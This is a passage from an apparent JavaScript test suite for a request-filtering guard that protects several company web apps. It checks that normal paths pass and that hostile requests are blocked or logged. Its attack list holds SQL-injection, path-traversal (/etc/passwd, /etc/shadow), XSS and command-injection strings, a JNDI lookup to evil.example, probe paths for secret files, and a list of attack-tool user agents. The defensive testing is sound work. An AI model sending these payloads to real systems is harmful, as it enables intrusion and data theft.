/* Testes do núcleo do guarda (Node 24, sem dependências).
   Rodar na raiz do repositório:  node guarda/teste/guarda.teste.mjs */
import assert from 'node:assert/strict';
import {
  CENTRAL, PORTAL, UA, UAS_NAVEGADOR, UAS_REAIS, SEM_NAVEGADOR, avancar, gerarChave, assinarJwt, sessaoPayload, oidcFalso, lista,
  centralFalsa, req, novoCtx, rodar, hmacHex, dormir, caso, conta, executar,
} from './apoio.mjs';

const URL_GUARDA = new URL('../sentinela-guarda.ts', import.meta.url).href;
let seq = 0;
// cada caso pega uma instância nova do módulo (cache, dedupe e mapa local zerados)
const novoGuarda = () => import(URL_GUARDA + '?caso=' + (++seq));

/* =========================================================
   Sistemas reais e seus caminhos legítimos
   ========================================================= */
const SISTEMAS = [
  { nome: 'Painel Lube', host: 'painel-lube-distribuidora.vercel.app', projeto: 'painel-lube-distribuidora', slug: null,
    proibidos: ['^/db/', '^/supabase/', '^/\\.claude/', '^/README\\.md$', '^/guarda/'],
    legitimos: ['/', '/index.html', '/admin.html', '/config.js', '/portal.js', '/admin.js', '/app.js', '/icones.js', '/marca.js',
      '/?abrir=gestao-financeiro', '/index.html?v=20260930', '/admin.html#usuarios', '/robots.txt', '/manifest.json', '/favicon.ico',
      '/sentinela/', '/sentinela/index.html', '/sentinela/sentinela.js', '/sentinela/vendor/globe.gl@2.46.2/globe.gl.min.js',
      '/sentinela/vendor/supabase-js@2.45.4/supabase.js', '/sentinela/dados/paises.geojson', '/sentinela/?demo=1',
      '/.well-known/appspecific/com.chrome.devtools.json', '/.well-known/security.txt', '/.well-known/change-password'] },
  { nome: 'BI Compras', host: 'painel-compras-rosy.vercel.app', projeto: 'painel-compras', slug: 'gestao-compras', proibidos: [],
    legitimos: ['/', '/index.html', '/api/dados', '/api/dados?inicio=2026-01-01&fim=2026-09-30&fornecedor=SHELL%20LUBRIFICANTES',
      ['POST', '/api/agente'], ['OPTIONS', '/api/agente'], '/agente.js', '/planilha.js', '/api/dados?busca=%C3%B3leo+20w50',
      '/api/dados?q=select+the+best+supplier', '/api/dados?ordem=margem%20desc&limite=50', '/dados.json'] },
  { nome: 'RH Absenteísmo', host: 'rh-absentismo.vercel.app', projeto: 'rh-absentismo', slug: 'rh-absenteismo',
    proibidos: ['\\.(xlsx?|csv|sql|ps1)$', '^/planilhas', '^/migrations/', '^/dashboard_dataset\\.json$', '^/powerbi_data\\.json$',
      '^/generate-config\\.js$', '^/README\\.md$', '^/verify_', '^/deploy_schema', '^/migrate_data'],
    legitimos: ['/', '/index.html', '/supabase-config.js', '/app.js', '/js/dashboard.js', '/js/graficos.js', '/login.html',
      ['POST', '/api/diagnostico'], ['POST', '/api/assistente'], '/?setor=Log%C3%ADstica&mes=2026-09', '/relatorio.html?id=12'] },
  { nome: 'Gestão TI', host: 'gestao-ti-ruddy.vercel.app', projeto: 'gestao-ti', slug: 'gestao-ti', proibidos: [],
    legitimos: ['/login', '/login?de=%2Fchamados', ['POST', '/api/auth/login'], '/abrir-chamado', '/acompanhar',
      '/acompanhar?protocolo=2026-000123', '/acompanhar/2026-000123', '/setup', '/chamados', '/chamados?_rsc=1x2y3',
      '/_next/static/chunks/app/(painel)/page-3f9a1c2b.js', '/_next/static/chunks/app/%28painel%29/chamados/%5Bid%5D/page-ab12.js',
      '/_next/static/chunks/webpack-0f1e2d.js', '/_next/data/build-2026/chamados.json', '/_next/image?url=%2Flogo-lube.png&w=256&q=75',
      '/api/chamados', '/api/chamados?status=aberto&pagina=2', '/api/notas-avulsas/42/documentos', '/api/pendencias',
      '/api/chamados/publico', ['POST', '/api/chamados/publico'], ['POST', '/chamados'],
      '/_next/static/chunks/%5Broot-of-the-server%5D__6f2a91b3._.js', '/_next/static/chunks/src_app_(painel)_layout_tsx_1a2b3c._.js',
      '/_next/static/chunks/%5Bturbopack%5D_browser_dev_hmr-client_d6d8d4._.js'] },
  { nome: 'Painel ICMS', host: 'painel-icms.vercel.app', projeto: 'painel-icms', slug: 'painel-icms', proibidos: [],
    legitimos: ['/', '/icms3d.js', '/auth/callback?code=5b1f0e9e-6a1c-4f0e-9b5a-3c2d1e0f9a8b&next=%2F', '/auth/callback?code=abc123&next=/periodos',
      '/login', ['POST', '/api/assistente'], '/periodos?ano=2026&mes=06', '/_next/static/chunks/main-app-77aa.js',
      '/auth/callback?error=access_denied&error_code=otp_expired&error_description=Email+link+is+invalid+or+has+expired',
      '/api/periodos?intervalo=2026-01..2026-09', '/?filtro=CFOP%205405%20or%206405'] },
  { nome: 'Saída de Veículos', host: 'gestao-de-saidas-de-veiculos.vercel.app', projeto: 'gestao-de-saidas-de-veiculos', slug: 'saida-veiculos',
    proibidos: ['^/processar\\.py$', '^/PLANILHAS REFERENCIAS/', '^/design do sistema', '^/README\\.md$'],
    legitimos: ['/', '/index.html', '/dados.json', '/app.js', '/?placa=ABC1D23'] },
];

const ATAQUES = [
  // [caminho, regra esperada]
  ['/.env', 'varredura'], ['/.env.local', 'varredura'], ['/.env.production', 'varredura'], ['/app/.env', 'varredura'],
  ['/.git/config', 'varredura'], ['/.git/HEAD', 'varredura'], ['/.svn/entries', 'varredura'], ['/.aws/credentials', 'varredura'],
  ['/.DS_Store', 'varredura'], ['/.htaccess', 'varredura'], ['/.ENV', 'varredura'],
  ['/wp-login.php', 'varredura'], ['/wp-admin/', 'varredura'], ['/wp-content/plugins/x/readme.txt', 'varredura'],
  ['/wordpress/wp-admin/setup-config.php', 'varredura'], ['/xmlrpc.php', 'varredura'], ['/index.php', 'varredura'],
  ['/index.php/module/action', 'varredura'], ['/admin/config.asp', 'varredura'], ['/login.aspx', 'varredura'], ['/manager/html.jsp', 'varredura'],
  ['/phpmyadmin/', 'varredura'], ['/phpMyAdmin/index.php', 'varredura'], ['/pma/', 'varredura'], ['/cgi-bin/luci/;stok=/locale', 'varredura'],
  ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'varredura'], ['/laravel/vendor/phpunit/phpunit/Util/PHP/eval-stdin', 'varredura'],
  ['/server-status', 'varredura'], ['/actuator/env', 'varredura'], ['/actuator/health', 'varredura'], ['/boaform/admin/formLogin', 'varredura'],
  ['/HNAP1/', 'varredura'], ['/owa/auth/logon', 'varredura'], ['/autodiscover/autodiscover.xml', 'varredura'], ['/solr/admin/info/system', 'varredura'],
  ['/_ignition/execute-solution', 'varredura'], ['/telescope/requests', 'varredura'], ['/config.yml', 'varredura'], ['/secrets.yaml', 'varredura'],
  ['/credentials.ini', 'varredura'], ['/backup.bak', 'varredura'], ['/index.html.old', 'varredura'], ['/.index.html.swp', 'varredura'],
  ['/.well-known/../.env', 'varredura'], ['/.well-known/shell.php', 'varredura'], ['/.well-known/ALFA_DATA/', 'varredura'], ['/.well-known/', 'varredura'],
  ['/?id=1%20UNION%20SELECT%201,2,3--', 'injecao'], ['/api/dados?id=1+union+select+null,null', 'injecao'],
  ['/api/dados?id=1/**/UNION/**/SELECT/**/1', 'injecao'], ['/?id=1%20union/*!50000*/select%201', 'injecao'],
  ["/?q=1'%20or%20'1'='1", 'injecao'], ["/?usuario=admin'or'1'='1", 'injecao'], ['/?q=1%20or%201=1', 'injecao'], ['/api/dados?f=x+OR+1%3D1', 'injecao'],
  ['/../../etc/passwd', 'injecao'], ['/download?arquivo=../../etc/passwd', 'injecao'], ['/download?arquivo=..%2F..%2F..%2Fetc%2Fshadow', 'injecao'],
  ['/%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'injecao'], ['/?f=%252e%252e%252fetc%252fpasswd', 'injecao'], ['/?c=..%5C..%5Cwindows%5Cwin.ini', 'injecao'],
  ['/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D', 'injecao'], ['/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'injecao'],
  ['/?u=javascript:alert(document.cookie)', 'injecao'], ['/?id=1%20AND%20SLEEP(5)', 'injecao'], ['/?id=1%20and%20benchmark(5000000,md5(1))', 'injecao'],
  ['/?t=information_schema.tables', 'injecao'], ['/?cmd=cmd.exe%20/c%20dir', 'injecao'], ['/api/dados?x=%25%32%65%25%32%65%25%32%66etc%25%32%66passwd', 'injecao'],
];

const UAS_ATAQUE = [
  'sqlmap/1.8.4#stable (https://sqlmap.org)', 'Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000003)',
  'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)',
  'Mozilla/5.0 zgrab/0.x', 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)', 'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)',
  'gobuster/3.6', 'Fuzz Faster U Fool v2.1.0-dev', 'Mozilla/5.0 (Hydra)', 'Wfuzz/3.1.0', 'WhatWeb/0.5.5', 'feroxbuster/2.10.4', 'l9explore/1.2.2',
];

/* ---------- auxiliares de verificação ---------- */
function bloqueio403(r, tipo) {
  assert.ok(r, 'esperava Response, veio null');
  assert.equal(r.status, 403);
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.equal(r.headers.get('x-robots-tag'), 'noindex');
  assert.equal(r.headers.get('x-sentinela'), 'bloqueado');
  if (tipo === 'api') assert.match(r.headers.get('content-type'), /application\/json/);
  else assert.match(r.headers.get('content-type'), /text\/html/);
  conta(5);
}

async function corpo403(r, tipo) {
  const txt = await r.text();
  if (tipo === 'api') {
    const j = JSON.parse(txt);
    assert.equal(j.erro, 'bloqueado');
    assert.match(j.incidente, /^[0-9a-f]{8}$/);
    assert.deepEqual(Object.keys(j).sort(), ['erro', 'incidente']);
    conta(3);
    return j.incidente;
  }
  assert.ok(txt.includes('Acesso bloqueado pela Sentinela Lube'));
  assert.ok(txt.includes('#050b1c'));
  assert.ok(txt.includes('Se você é da Lube, envie este código ao TI: <a href="mailto:cpd@lube.com.br">cpd@lube.com.br</a>'));
  const m = /<div class="k">([0-9a-f]{8})<\/div>/.exec(txt);
  assert.ok(m, 'código do incidente na página');
  conta(4);
  return m[1];
}

const tipoDe = (caminho) => (caminho.startsWith('/api/') ? 'api' : 'outro');

/* =========================================================
   1. Uso legítimo: nada é barrado e o evento sai como liberado
   ========================================================= */
for (const modo of ['observar', 'proteger']) {
  caso('caminhos legítimos dos 6 sistemas → null (modo ' + modo + ')', async () => {
    let total = 0;
    for (const s of SISTEMAS) {
      const g = await novoGuarda();
      const c = centralFalsa(lista({ modo, projeto: s.projeto, slug: s.slug, proibidos: s.proibidos }));
      let i = 0;
      for (const item of s.legitimos) {
        const [metodo, caminho] = Array.isArray(item) ? item : ['GET', item];
        const ua = UAS_REAIS[i++ % UAS_REAIS.length];
        const r = await rodar(g, req(s.host, caminho, { metodo, ua, ip: '200.165.10.' + (i % 250) }));
        assert.equal(r, null, s.nome + ' ' + metodo + ' ' + caminho + ' deveria seguir');
        conta(); total++;
      }
      const evs = c.eventos;
      assert.equal(evs.length, s.legitimos.length, s.nome + ': um evento por caminho');
      for (const ev of evs) {
        assert.equal(ev.decisao, 'liberado', s.nome + ' ' + ev.caminho + ' → ' + ev.decisao + ' ' + ev.regra);
        assert.equal(ev.regra, null);
        conta(2);
      }
    }
    assert.ok(total > 80);
  });
}

caso('evento liberado tem os campos do contrato (§3.3)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const r = await rodar(g, req('painel-compras-rosy.vercel.app', '/api/dados?inicio=2026-01-01', {
    headers: { referer: 'https://painel-lube-distribuidora.vercel.app/?abrir=gestao-compras&token=abc', 'x-vercel-ip-city': 'S%C3%A3o%20Paulo', 'x-vercel-ja4-digest': 't13d1516h2_8daaf6152771_e5627efa2ab1' },
  }));
  assert.equal(r, null);
  assert.equal(c.eventos.length, 1);
  const ev = c.eventos[0];
  const chaves = ['ts', 'metodo', 'host', 'caminho', 'consulta', 'tipo', 'ip', 'pais', 'regiao', 'cidade', 'lat', 'lon', 'fuso', 'ua', 'idioma',
    'referer', 'ja4', 'vercel_id', 'sec_fetch_site', 'sec_fetch_mode', 'sec_fetch_dest', 'decisao', 'regra', 'motivo', 'identidade', 'identidade_origem'];
  assert.deepEqual(Object.keys(ev).sort(), chaves.sort());
  assert.equal(ev.tipo, 'api');
  assert.equal(ev.caminho, '/api/dados');
  assert.equal(ev.consulta, '?inicio=2026-01-01');
  assert.equal(ev.cidade, 'São Paulo');
  assert.equal(ev.lat, -20.2632);
  assert.equal(ev.referer, 'https://painel-lube-distribuidora.vercel.app');   // só a origem
  assert.equal(ev.ja4, 't13d1516h2_8daaf6152771_e5627efa2ab1');
  assert.ok(!Number.isNaN(Date.parse(ev.ts)));
  // cabeçalhos do POST /evento
  const ch = c.rota('/evento')[0];
  assert.match(ch.headers.get('authorization'), /^Bearer ey/);
  assert.equal(ch.headers.get('content-type'), 'application/json');
  assert.equal(ch.headers.get('x-sentinela-guarda'), 'sentinela-guarda/1.1.0');
  assert.equal(ch.headers.get('x-sentinela-runtime'), 'nodejs');
  assert.equal(ch.init.method, 'POST');
  conta(15);
});

caso('tipo: /api/ → api; extensão ≠ .html → arquivo; resto → pagina', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  for (const p of ['/api/dados', '/agente.js', '/dados.json', '/index.html', '/', '/acompanhar', '/sentinela/']) {
    await rodar(g, req('painel-compras-rosy.vercel.app', p));
  }
  const t = Object.fromEntries(c.eventos.map((e) => [e.caminho, e.tipo]));
  assert.deepEqual(t, { '/api/dados': 'api', '/agente.js': 'arquivo', '/dados.json': 'arquivo', '/index.html': 'pagina', '/': 'pagina', '/acompanhar': 'pagina', '/sentinela/': 'pagina' });
  conta();
});

caso('consulta registrada sem valores sensíveis (token, code, senha)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  await rodar(g, req('painel-icms.vercel.app', '/auth/callback?code=5b1f0e9e-6a1c&next=%2F&token=xyz'));
  assert.equal(c.eventos[0].consulta, '?code=***&next=%2F&token=***');
  conta();
});

/* =========================================================
   2. Ataques reais → 403
   ========================================================= */
caso('ataques reais (' + ATAQUES.length + ' caminhos) → 403 HTML/JSON, regra certa', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  let i = 0;
  for (const [caminho, regra] of ATAQUES) {
    const ip = '45.155.' + Math.floor(i / 250) + '.' + (i++ % 250);
    const r = await rodar(g, req('painel-compras-rosy.vercel.app', caminho, { ip }));
    const ev = c.eventos[c.eventos.length - 1];
    const tipo = ev.tipo === 'api' ? 'api' : 'outro';
    assert.ok(r, caminho + ' deveria ser barrado');
    bloqueio403(r, tipo);
    const cod = await corpo403(r, tipo);
    assert.equal(ev.decisao, 'bloqueado', caminho);
    assert.equal(ev.regra, regra, caminho + ': regra ' + ev.regra + ' (' + ev.motivo + ')');
    assert.ok(ev.motivo.includes('incidente ' + cod), 'motivo traz o incidente');
    conta(3);
  }
});

caso('ferramentas de ataque no user-agent (' + UAS_ATAQUE.length + ') → 403 regra ferramenta', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  let i = 0;
  for (const ua of UAS_ATAQUE) {
    for (const caminho of ['/', '/api/dados']) {
      const r = await rodar(g, req('painel-compras-rosy.vercel.app', caminho, { ua, ip: '89.248.165.' + (i++) }));
      bloqueio403(r, tipoDe(caminho));
      await corpo403(r, tipoDe(caminho));
      assert.equal(c.eventos.at(-1).regra, 'ferramenta', ua);
      conta();
    }
  }
});

caso('ataque é barrado mesmo com a central fora do ar (regras locais)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  c.fora = true;
  for (const [caminho] of ATAQUES.slice(0, 15)) {
    const r = await rodar(g, req('painel-compras-rosy.vercel.app', caminho, { ip: '91.92.93.' + (++seq % 250) }));
    bloqueio403(r, tipoDe(caminho));
  }
  const r = await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ua: 'sqlmap/1.8' }));
  bloqueio403(r, 'outro');
});

caso('IP que atacou fica barrado neste guarda (mapa local 24 h), sem esperar a central', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista());
  const ip = '193.32.162.10';
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/.git/config', { ip })), 'outro');
  const r = await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ip }));
  bloqueio403(r, 'outro');
  assert.equal(c.eventos.at(-1).regra, 'lista');
  assert.match(c.eventos.at(-1).motivo, /barrado por este guarda/);
  avancar(24 * 3600000 + 1000);
  assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ip })), null, 'expira em 24 h');
  conta(3);
});

caso('buscador/prévia com caminho de ataque continua barrado', async () => {
  const g = await novoGuarda();
  centralFalsa(lista());
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/.env', { ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', ip: '66.249.66.1' })), 'outro');
  bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/wp-login.php', { ua: 'WhatsApp/2.23.20.0', ip: '66.249.66.2' })), 'outro');
});

/* =========================================================
   3. Lista da central
   ========================================================= */
caso('lista com bloqueio certo (IP, CIDR, IPv6, IPv4 mapeado, JA4) → 403; vencido → segue', async () => {
  const g = await novoGuarda();
  const futuro = new Date(Date.now() + 3600000).toISOString();
  const passado = new Date(Date.now() - 1000).toISOString();
  const c = centralFalsa(lista({
    bloqueios: [
      { id: 7, t: 'ip', v: '185.220.101.4', n: 'certo', ate: futuro },
      { id: 8, t: 'cidr', v: '103.21.244.0/22', n: 'certo', ate: null },
      { id: 9, t: 'cidr', v: '2001:db8::/32', n: 'certo', ate: null },
      { id: 10, t: 'ja4', v: 't13d1516h2_ruim', n: 'certo', ate: null },
      { id: 11, t: 'ip', v: '5.6.7.8', n: 'certo', ate: passado },
    ],
  }));
  const casos403 = [
    { ip: '185.220.101.4' }, { ip: '103.21.247.200' }, { ip: '2001:db8:85a3::8a2e:370:7334' }, { ip: '::ffff:185.220.101.4' },
    { ip: '150.1.1.1', headers: { 'x-vercel-ja4-digest': 't13d1516h2_ruim' } },
  ];
  for (const o of casos403) {
    bloqueio403(await rodar(g, req('painel-compras-rosy.vercel.app', '/', o)), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'lista');
  }
  const rApi = await rodar(g, req('painel-compras-rosy.vercel.app', '/api/dados', { ip: '185.220.101.4' }));
  bloqueio403(rApi, 'api');
  await corpo403(rApi, 'api');
  assert.match(c.eventos.at(-1).motivo, /#7 \(certo\)/);
  assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ip: '5.6.7.8' })), null, 'bloqueio vencido não vale');
  assert.equal(await rodar(g, req('painel-compras-rosy.vercel.app', '/', { ip: '103.21.248.1' })), null, 'fora do /22');
  conta(8);
});

caso('suspeito no modo observar → segue + evento observado (arquivo proibido, robô, lista)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({
    projeto: 'painel-lube-distribuidora', slug: null, proibidos: ['^/db/', '^/supabase/', '^/\\.claude/', '^/README\\.md$', '^/guarda/'],
    bloqueios: [{ id: 21, t: 'ip', v: '79.124.8.8', n: 'suspeito', ate: null }],
  }));
  const H = 'painel-lube-distribuidora.vercel.app';
  const esperado = [
    [req(H, '/README.md'), 'arquivo_proibido'], [req(H, '/db/01_schema.sql', { ip: '1.1.1.2' }), 'arquivo_proibido'],
    [req(H, '/guarda/sentinela-guarda.ts', { ip: '1.1.1.3' }), 'arquivo_proibido'], [req(H, '/.claude/launch.json', { ip: '1.1.1.4' }), 'arquivo_proibido'],
    [req(H, '/', { ua: 'curl/8.7.1', ip: '1.1.1.5' }), 'robo'], [req(H, '/api/x', { ua: 'python-requests/2.32.3', ip: '1.1.1.6' }), 'robo'],
    [req(H, '/', { ua: null, ip: '1.1.1.7' }), 'robo'], [req(H, '/', { ip: '79.124.8.8' }), 'lista'],
    [req(H, '/', { ua: 'Mozilla/5.0 (compatible)', ip: '1.1.1.10' }), 'robo'],
    [req(H, '/', { ip: '1.1.1.11', headers: SEM_NAVEGADOR }), 'nao_navegador'],
    [req(H, '/', { ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', ip: '1.1.1.12' }), 'buscador'],
  ];
  for (const [r, regra] of esperado) {
    assert.equal(await rodar(g, r), null);
    const ev = c.eventos.at(-1);
    assert.equal(ev.decisao, 'observado');
    assert.equal(ev.regra, regra);
    conta(3);
  }
  // robô só conta em página/api: arquivo com curl segue liberado
  assert.equal(await rodar(g, req(H, '/config.js', { ua: 'curl/8.7.1', ip: '1.1.1.9' })), null);
  assert.equal(c.eventos.at(-1).decisao, 'liberado');
  conta(2);
});

caso('suspeito no modo proteger → 403', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({
    modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null, proibidos: ['^/README\\.md$', '^/db/'],
    bloqueios: [{ id: 21, t: 'ip', v: '79.124.8.8', n: 'suspeito', ate: null }],
  }));
  const H = 'painel-lube-distribuidora.vercel.app';
  bloqueio403(await rodar(g, req(H, '/README.md')), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'arquivo_proibido');
  bloqueio403(await rodar(g, req(H, '/api/x', { ua: 'curl/8.7.1', ip: '1.1.1.5' })), 'api');
  assert.equal(c.eventos.at(-1).regra, 'robo');
  bloqueio403(await rodar(g, req(H, '/', { ip: '79.124.8.8' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'lista');
  bloqueio403(await rodar(g, req(H, '/', { ip: '1.1.1.13', headers: SEM_NAVEGADOR })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'nao_navegador');
  bloqueio403(await rodar(g, req(H, '/api/x', { ua: 'Vercel MCP Fetch', ip: '1.1.1.14' })), 'api');
  assert.equal(c.eventos.at(-1).regra, 'robo');
  conta(5);
});

caso('confiável: bloqueio suspeito e robô seguem; ataque certo → 403 sem bloqueio local', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({
    modo: 'proteger', confiaveis: [{ t: 'cidr', v: '177.100.20.0/24' }, { t: 'ip', v: '2804:14c::1' }],
    bloqueios: [{ id: 30, t: 'ip', v: '177.100.20.30', n: 'suspeito', ate: null }, { id: 31, t: 'cidr', v: '2804:14c::/32', n: 'suspeito', ate: null }],
  }));
  const H = 'painel-compras-rosy.vercel.app';
  assert.equal(await rodar(g, req(H, '/', { ip: '177.100.20.30' })), null, 'confiável com bloqueio suspeito segue');
  assert.equal(c.eventos.at(-1).decisao, 'liberado');
  assert.match(c.eventos.at(-1).motivo, /rede confiável/);
  assert.equal(await rodar(g, req(H, '/', { ip: '2804:14c::1' })), null, 'IPv6 confiável segue');
  assert.equal(await rodar(g, req(H, '/api/dados', { ip: '177.100.20.31', ua: 'python-requests/2.32' })), null, 'script do escritório segue');
  const r = await rodar(g, req(H, '/.env', { ip: '177.100.20.32' }));
  bloqueio403(r, 'outro');
  assert.match(c.eventos.at(-1).motivo, /ataque partindo de rede confiável — verificar máquina/);
  assert.equal(await rodar(g, req(H, '/', { ip: '177.100.20.32' })), null, 'confiável não ganha bloqueio de IP');
  conta(6);
});

caso('exceções no proteger: cron e prévia de link liberados; buscador (1.1.0) é suspeito → 403', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger' }));
  const H = 'painel-compras-rosy.vercel.app';
  const tab = [
    ['vercel-cron/1.0', '/api/cron/atualizar', 'liberado', 'cron'],
    ['WhatsApp/2.23.20.0', '/', 'liberado', 'previa_link'],
    ['TelegramBot (like TwitterBot)', '/', 'liberado', 'previa_link'],
    ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36 SkypeUriPreview Preview/0.5', '/', 'liberado', 'previa_link'],
    ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', '/', 'bloqueado', 'buscador'],
    ['Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)', '/', 'bloqueado', 'buscador'],
  ];
  let i = 0;
  for (const [ua, caminho, decisao, regra] of tab) {
    const r = await rodar(g, req(H, caminho, { ua, ip: '64.233.160.' + (i++) }));
    if (decisao === 'bloqueado') bloqueio403(r, 'outro');
    else assert.equal(r, null, ua);
    assert.equal(c.eventos.at(-1).decisao, decisao);
    assert.equal(c.eventos.at(-1).regra, regra);
    conta(3);
  }
});

caso('exceções (UA falsificável) não furam o exige_login', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: true, rotas: ['/api/cron/'] }));
  const H = 'gestao-finaceiro.vercel.app';
  assert.equal((await rodar(g, req(H, '/api/dados', { ua: 'vercel-cron/1.0' }))).status, 401);
  assert.equal((await rodar(g, req(H, '/api/dados', { ua: 'WhatsApp/2.23.20.0', ip: '2.2.2.2' }))).status, 401);
  assert.equal((await rodar(g, req(H, '/', { ua: 'Mozilla/5.0 (compatible; Googlebot/2.1)', ip: '2.2.2.3' }))).status, 302);
  assert.equal(await rodar(g, req(H, '/api/cron/fechamento', { ua: 'vercel-cron/1.0', ip: '2.2.2.4' })), null, 'cron em rota pública');
  assert.equal(c.eventos.at(-1).regra, 'cron');
  // robô observado + sem login: vale o login, e o motivo guarda o robô
  assert.equal((await rodar(g, req(H, '/api/dados', { ua: 'curl/8', ip: '2.2.2.5' }))).status, 401);
  assert.match(c.eventos.at(-1).motivo, /também robo/);
  conta(7);
});

/* =========================================================
   4. Sessão e exige_login
   ========================================================= */
async function cenarioLogin(extra = {}) {
  const chave = await gerarChave('a1b2c3d4e5f60718');
  const outra = await gerarChave('ffffffffffffffff');
  const c = centralFalsa(lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: true, rotas: ['/publico/', '/favicon.ico'], chaves: [chave.jwk], ...extra }));
  return { chave, outra, c, H: 'gestao-finaceiro.vercel.app' };
}

caso('exige_login sem sessão: página GET → 302 portal; API → 401 JSON; POST de página → 401', async () => {
  const g = await novoGuarda();
  const { c, H } = await cenarioLogin();
  const r = await rodar(g, req(H, '/'));
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), PORTAL + '/?abrir=gestao-financeiro');
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.equal(c.eventos.at(-1).regra, 'sem_login');
  assert.equal(c.eventos.at(-1).decisao, 'bloqueado');
  const head = await rodar(g, req(H, '/folha.html', { metodo: 'HEAD' }));
  assert.equal(head.status, 302);
  const a = await rodar(g, req(H, '/api/dados'));
  assert.equal(a.status, 401);
  assert.equal(a.headers.get('cache-control'), 'no-store');
  assert.deepEqual(await a.json(), { erro: 'login_necessario', portal: PORTAL });
  const js = await rodar(g, req(H, '/app.js'));
  assert.equal(js.status, 401, 'arquivo sem sessão → 401');
  const p = await rodar(g, req(H, '/', { metodo: 'POST' }));
  assert.equal(p.status, 401);
  conta(11);
});

caso('exige_login: rotas públicas seguem; lista ausente → falha aberta', async () => {
  const g = await novoGuarda();
  const { H } = await cenarioLogin();
  assert.equal(await rodar(g, req(H, '/publico/aviso.html')), null);
  assert.equal(await rodar(g, req(H, '/favicon.ico')), null);
  assert.notEqual(await rodar(g, req(H, '/publicox')), null, '/publico/ não libera /publicox');
  const g2 = await novoGuarda();
  const c2 = centralFalsa(null);
  assert.equal(await rodar(g2, req(H, '/')), null, 'sem lista não exige login');
  assert.equal(c2.rota('/lista').length, 1);
  conta(4);
});

/* ---------- modo fechado: sem lista, só passa quem tem sessão ---------- */
const FECHADO_FIN = { projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', rotas: ['/publico/'] };

caso('fechado + central fora: sem sessão → portal/401; rota pública segue; sessão válida segue; ataque barrado', async () => {
  const g = await novoGuarda();
  const chave = await gerarChave('a1b2c3d4e5f60718');
  const fechado = { ...FECHADO_FIN, chaves: [chave.jwk] };
  const c = centralFalsa(null);
  c.fora = true;
  const H = 'gestao-finaceiro.vercel.app';
  const r = await rodar(g, req(H, '/'), { fechado });
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), PORTAL + '/?abrir=gestao-financeiro');
  const a = await rodar(g, req(H, '/api/dados'), { fechado });
  assert.equal(a.status, 401);
  assert.deepEqual(await a.json(), { erro: 'login_necessario', portal: PORTAL });
  assert.equal(await rodar(g, req(H, '/publico/aviso.html'), { fechado }), null, 'rota pública do fechado');
  const sessao = await assinarJwt(sessaoPayload(), chave);
  assert.equal(await rodar(g, req(H, '/folha.html', { cookie: '__Host-sentinela=' + sessao }), { fechado }), null, 'sessão válida pela chave fixa');
  const outra = await gerarChave('ffffffffffffffff');
  const falsa = await assinarJwt(sessaoPayload(), outra);
  const rf = await rodar(g, req(H, '/', { cookie: '__Host-sentinela=' + falsa }), { fechado });
  assert.equal(rf.status, 302, 'sessão de outra chave não passa');
  const at = await rodar(g, req(H, '/.env'), { fechado });
  assert.equal(at.status, 403, 'ataque continua barrado');
  conta(9);
});

caso('fechado + chave fixa de fábrica: sessão de chave desconhecida → portal (sem ?abrir, não entra em laço)', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(null);
  c.fora = true;
  const chave = await gerarChave('a1b2c3d4e5f60718');
  const tok = await assinarJwt(sessaoPayload(), chave);
  const r = await rodar(g, req('gestao-finaceiro.vercel.app', '/', { cookie: '__Host-sentinela=' + tok }), { fechado: FECHADO_FIN });
  assert.equal(r.status, 302);
  assert.equal(r.headers.get('location'), PORTAL + '/');
  conta(2);
});

caso('fechado + partida a frio com central lenta (1,5 s): espera e usa a lista; exige_login=false no banco abre', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: false }));
  c.atrasoLista = 1500;
